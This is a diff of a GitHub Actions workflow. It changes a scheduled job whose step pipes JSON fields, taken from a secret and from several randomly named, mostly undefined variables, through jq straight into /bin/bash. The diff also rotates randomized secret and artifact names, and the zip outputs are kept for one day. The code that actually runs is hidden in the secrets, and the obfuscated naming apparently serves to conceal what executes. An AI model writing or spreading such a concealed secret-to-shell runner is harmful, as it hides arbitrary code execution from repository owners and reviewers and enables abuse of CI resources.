@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '24 0,6,12,18 * * *'
+    - cron: '58 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -18,19 +18,19 @@ jobs:
           fetch-depth: 1
       - name: Go
         env:
-          ufai8052: ${{ secrets.ufai8052 }}
+          ropr8: ${{ secrets.ropr8 }}
         run: |
-          printf '%s' "$ufai8052" | jq -r .r80 | /bin/bash
-          printf '%s' "$goan4" | jq -r .v99 | /bin/bash
-          echo $o9 | jq -r .ourr06 | /bin/bash
-          echo $isu053 | jq -r .yj8606 | /bin/bash
-          printf '%s' "$s4608" | jq -r .yn07 | /bin/bash
-          echo $czxzx29336 | jq -r .taegl1 | /bin/bash
+          printf '%s' "$ropr8" | jq -r .cmp65 | /bin/bash
+          printf '%s' "$fojoa508" | jq -r .d62 | /bin/bash
+          printf '%s' "$o35882" | jq -r .ybcd51 | /bin/bash
+          echo $rj5 | jq -r .qubd8 | /bin/bash
+          echo $zfml23645 | jq -r .bb6 | /bin/bash
+          echo $nlyte930 | jq -r .ulux83 | /bin/bash
 
       - name: Archive results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: K1yBwsSy
+          name: 7HN5dbh5
           path: "*.zip"
           retention-days: 1
